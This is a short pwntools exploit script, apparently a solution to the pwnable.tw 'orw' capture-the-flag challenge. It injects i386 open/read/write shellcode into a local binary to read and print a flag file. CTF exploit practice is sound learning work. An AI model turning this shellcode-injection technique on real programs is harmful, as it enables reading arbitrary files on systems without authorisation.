#! /usr/bin/python

from pwn import *

context.arch = 'i386'

HOST = "chall.pwnable.tw"
PORT = 10001

flag = 'myflag'

p = process("./orw")
p.recvuntil('Give my your shellcode:')

shellcode = ''
shellcode += shellcraft.open(flag)
shellcode += shellcraft.read('eax', 'esp', 32)
shellcode += shellcraft.write(1, 'esp', 32)
shellcode += shellcraft.exit(0)

p.sendline(asm(shellcode))
print p.recvline()

p.close()
